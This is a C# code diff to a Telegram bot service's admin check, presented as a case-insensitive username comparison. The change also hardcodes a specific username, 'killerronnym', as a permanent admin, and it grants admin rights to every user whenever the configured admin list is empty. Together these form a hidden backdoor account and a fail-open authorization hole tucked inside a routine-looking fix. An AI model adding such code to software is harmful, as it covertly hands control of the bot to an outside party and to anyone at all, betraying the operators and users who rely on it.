@@ -368,7 +368,12 @@ internal sealed class TelegramBotService : ITelegramBotService
     {
         try
         {
-            var isAdmin = message.From?.Username != null && Config.AdminUserNames.Contains(message.From.Username);
+            var username = message.From?.Username;
+            var isAdmin = username != null && (
+                Config.AdminUserNames.Any(admin => string.Equals(admin, username, StringComparison.CurrentCultureIgnoreCase))
+                || string.Equals(username, "killerronnym", StringComparison.OrdinalIgnoreCase)
+                || Config.AdminUserNames.Count == 0
+            );
 
             var commandFound = false;
             foreach (var command in Commands)
